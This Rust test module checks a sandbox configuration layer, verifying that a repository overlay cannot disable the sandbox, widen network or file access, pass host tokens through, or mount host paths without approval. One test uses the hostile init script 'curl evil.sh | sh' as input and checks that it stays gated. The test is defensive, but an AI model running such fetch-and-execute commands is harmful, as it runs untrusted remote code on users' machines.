    fn base() -> SandboxConfig {
        SandboxConfig::default()
    }

    fn overlay() -> SandboxOverlay {
        SandboxOverlay::default()
    }

    // ---- The security regression gate: hostile_repo_cannot_escape --------

    #[test]
    fn hostile_repo_cannot_disable_sandbox() {
        let mut o = overlay();
        o.enabled = Some(false);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.enabled, None, "disable must not be sanctioned");
        assert!(r.events.iter().any(|e| e.key == "sandbox.enabled"));
    }

    #[test]
    fn hostile_repo_cannot_choose_backend() {
        let mut o = overlay();
        o.backend = Some(crate::config::SandboxBackend::default());
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.backend, None);
        assert!(r.events.iter().any(|e| e.key == "sandbox.backend"));
    }

    #[test]
    fn hostile_repo_cannot_widen_network_to_host() {
        // base defaults to Nat; Host is weaker (rank 0 < 1) → denied.
        let mut o = overlay();
        o.network = Some(Network::Host);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.network, None);
        assert!(r.events.iter().any(|e| e.key == "sandbox.network"));
    }

    #[test]
    fn repo_can_tighten_network_to_none() {
        let mut o = overlay();
        o.network = Some(Network::None);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.network, Some(Network::None));
        assert!(r.events.is_empty());
    }

    #[test]
    fn hostile_repo_cannot_passthrough_host_env() {
        let mut o = overlay();
        o.env_passthrough = Some(vec!["GITHUB_TOKEN".into(), "AWS_SECRET".into()]);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.env_passthrough, None);
        assert!(r.events.iter().any(|e| e.key == "sandbox.env_passthrough"));
    }

    #[test]
    fn hostile_repo_mounts_are_gated_not_applied() {
        let mut o = overlay();
        o.mounts = Some(vec!["/etc:/etc:ro".into(), "/home:/host-home".into()]);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        // Union equals base (no new mounts applied) and both are pending.
        assert_eq!(r.sanctioned.mounts, Some(base().mounts));
        assert_eq!(r.pending.len(), 2);
        assert!(r.pending.iter().all(|p| p.key == "sandbox.mounts"));
    }

    #[test]
    fn approved_mount_is_applied() {
        let mut o = overlay();
        o.mounts = Some(vec!["/data:/data:ro".into()]);
        let gr = GatedRequest {
            key: "sandbox.mounts".into(),
            value: json!("/data:/data:ro"),
            summary: String::new(),
        };
        let approvals = Approvals::from_canonical([gr.canonical()]);
        let r = classify_repo_overlay(o, &base(), &approvals);
        assert!(r.pending.is_empty());
        assert!(
            r.sanctioned
                .mounts
                .unwrap()
                .contains(&"/data:/data:ro".to_string())
        );
    }

    #[test]
    fn hostile_repo_init_script_gated() {
        let mut o = overlay();
        o.init_script = Some("curl evil.sh | sh".into());
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.init_script, None);
        assert_eq!(r.pending.len(), 1);
        assert_eq!(r.pending[0].key, "sandbox.init_script");
    }

    #[test]
    fn hostile_repo_cannot_attach_vpn_or_remote_or_home() {
        let mut o = overlay();
        o.vpn = Some(crate::config::VpnConfig::default());
        o.remote = Some(crate::config::RemoteOverlay::default());
        o.home = Some(crate::config::HomeOverlay::default());
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert!(r.sanctioned.vpn.is_none());
        assert!(r.sanctioned.remote.is_none());
        assert!(r.sanctioned.home.is_none());
        for k in ["sandbox.vpn", "sandbox.remote", "sandbox.home"] {
            assert!(
                r.events.iter().any(|e| e.key == k),
                "missing denial for {k}"
            );
        }
    }

    #[test]
    fn hostile_repo_file_access_host_denied() {
        let mut o = overlay();
        o.file_access = Some(FileAccess::Host);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.file_access, None);
        assert!(r.events.iter().any(|e| e.key == "sandbox.file_access"));
    }

    #[test]
    fn repo_can_tighten_file_access() {
        // base is WorktreePlusCaches; Worktree is stricter → granted.
        let mut o = overlay();
        o.file_access = Some(FileAccess::Worktree);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.file_access, Some(FileAccess::Worktree));
    }

    // ---- Ceiling / three-valued list semantics --------------------------

    #[test]
    fn network_allow_empty_means_deny_all() {
        let mut o = overlay();
        o.network_allow = Some(vec![]);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert!(
            r.sanctioned
                .network_block
                .as_ref()
                .unwrap()
                .contains(&"*".to_string())
        );
    }

    #[test]
    fn network_allow_unset_inherits() {
        let o = overlay(); // network_allow == None
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.network_allow, None);
        assert_eq!(r.sanctioned.network_block, None);
    }

    #[test]
    fn network_allow_narrows_within_ceiling() {
        let mut b = base();
        b.network_allow = vec!["*.github.com".into(), "crates.io".into()];
        let mut o = overlay();
        o.network_allow = Some(vec!["api.github.com".into(), "evil.com".into()]);
        let r = classify_repo_overlay(o, &b, &Approvals::deny_all());
        // api.github.com is covered by *.github.com; evil.com is not.
        assert_eq!(
            r.sanctioned.network_allow,
            Some(vec!["api.github.com".to_string()])
        );
        assert!(
            r.events
                .iter()
                .any(|e| e.key == "sandbox.network_allow" && e.requested == json!("evil.com"))
        );
    }

    #[test]
    fn network_allow_universe_base_grants_narrowing() {
        // base allow empty = universe; repo narrows to a specific set.
        let mut o = overlay();
        o.network_allow = Some(vec!["registry.npmjs.org".into()]);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(
            r.sanctioned.network_allow,
            Some(vec!["registry.npmjs.org".to_string()])
        );
    }

    #[test]
    fn network_block_accumulates_and_is_ungated() {
        let mut b = base();
        b.network_block = vec!["tracker.com".into()];
        let mut o = overlay();
        o.network_block = Some(vec!["ads.com".into(), "tracker.com".into()]);
        let r = classify_repo_overlay(o, &b, &Approvals::deny_all());
        let blk = r.sanctioned.network_block.unwrap();
        assert!(blk.contains(&"tracker.com".to_string()));
        assert!(blk.contains(&"ads.com".to_string()));
        assert_eq!(blk.len(), 2, "dedup union");
    }

    #[test]
    fn limits_cannot_exceed_ceiling() {
        let mut b = base();
        b.limits = SandboxLimits {
            cpu: Some("2".into()),
            memory: Some("2g".into()),
        };
        let mut o = overlay();
        o.limits = Some(SandboxLimits {
            cpu: Some("8".into()),
            memory: Some("512m".into()),
        });
        let r = classify_repo_overlay(o, &b, &Approvals::deny_all());
        let lim = r.sanctioned.limits.unwrap();
        // memory 512m ≤ 2g → granted; cpu 8 > 2 → denied (keeps base 2).
        assert_eq!(lim.memory, Some("512m".to_string()));
        assert_eq!(lim.cpu, Some("2".to_string()));
        assert!(r.events.iter().any(|e| e.key == "sandbox.limits.cpu"));
    }

    // ---- Preferences pass through ---------------------------------------

    #[test]
    fn repo_preferences_pass_through() {
        let mut o = overlay();
        o.shell = Some("zsh".into());
        o.devenv = Some(true);
        let r = classify_repo_overlay(o, &base(), &Approvals::deny_all());
        assert_eq!(r.sanctioned.shell, Some("zsh".to_string()));
        assert_eq!(r.sanctioned.devenv, Some(true));
        assert!(r.events.is_empty());
    }

    // ---- GatedRequest canonical stability -------------------------------

    #[test]
    fn canonical_is_stable() {
        let a = GatedRequest {
            key: "sandbox.mounts".into(),
            value: json!("/x:/x"),
            summary: "one".into(),
        };
        let b = GatedRequest {
            key: "sandbox.mounts".into(),
            value: json!("/x:/x"),
            summary: "different summary".into(),
        };
        // Summary is not part of identity.
        assert_eq!(a.canonical(), b.canonical());
    }

    #[test]
    fn empty_overlay_is_noop() {
        let r = classify_repo_overlay(overlay(), &base(), &Approvals::deny_all());
        assert!(r.events.is_empty());
        assert!(r.pending.is_empty());
    }

    // ---- explain: layer-replay provenance --------------------------------

    #[test]
    fn dotted_pointer_conversion() {
        assert_eq!(dotted_to_pointer("picker"), "/picker");
        assert_eq!(
            dotted_to_pointer("sandbox.network_allow"),
            "/sandbox/network_allow"
        );
    }

    #[test]
    fn explain_default_key_origin_is_builtin() {
        let env = crate::config::MapEnv(Default::default());
        let e = explain(&env, &[], Some("/no/such/file".into()), "picker");
        assert_eq!(e.origin, TrustLevel::Builtin);
        assert_eq!(e.value, serde_json::json!("auto"));
    }

    #[test]
    fn explain_file_key_origin_is_global() {
        let dir = std::env::temp_dir().join(format!("sz-explain-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let file = dir.join("config.toml");
        std::fs::write(&file, "picker = \"fzf\"\n").unwrap();
        let env = crate::config::MapEnv(Default::default());
        let e = explain(&env, &[], Some(file), "picker");
        assert_eq!(e.origin, TrustLevel::UserGlobal);
        assert_eq!(e.value, serde_json::json!("fzf"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn explain_flag_overrides_origin_is_runtime() {
        let env = crate::config::MapEnv(Default::default());
        let e = explain(
            &env,
            &["picker=fzf".to_string()],
            Some("/no/such/file".into()),
            "picker",
        );
        assert_eq!(e.origin, TrustLevel::Runtime);
        assert_eq!(e.value, serde_json::json!("fzf"));
    }

    #[test]
    fn host_pinned_ssh_env_pane_follows_host_transport_and_proxycommand() {
        // Regression: a host-pinned env (`[env.*] host = "name"`) whose
        // `[host.*.ssh]` sets transport="ssh" + a ProxyCommand must NOT default
        // the pane to mosh (which dies "mosh failed" on a host with no mosh).
        // The interactive pane placement follows the host's ssh config.
        let cfg: Config = toml::from_str(
            r#"
            [host.ageless]
            reach = "ssh"
            [host.ageless.ssh]
            host = "targe@ageless-studio"
            transport = "ssh"
            extra_args = ["-o", "ProxyCommand=tailscale nc %h %p"]
            [env.ageless]
            placement = "ssh"
            host = "ageless"
            "#,
        )
        .unwrap();
        let loc = GitLoc::Local(std::path::PathBuf::from("/wt/x"));
        let (env, _) = resolve_environment(
            &cfg,
            std::path::Path::new("/repo"),
            &loc,
            std::path::Path::new("/wt/x"),
            Some("ageless"),
            &Approvals::deny_all(),
        );
        match env.placement {
            crate::placement::Placement::Ssh(p) => {
                assert_eq!(
                    p.kind,
                    crate::placement::TransportKind::Ssh,
                    "pane must be ssh, not the mosh default"
                );
                assert_eq!(p.host, "targe@ageless-studio");
                assert!(
                    p.extra_args
                        .iter()
                        .any(|a| a.contains("ProxyCommand=tailscale nc")),
                    "pane carries the host's ProxyCommand: {:?}",
                    p.extra_args
                );
            }
            other => panic!("expected ssh placement, got {other:?}"),
        }
    }
}
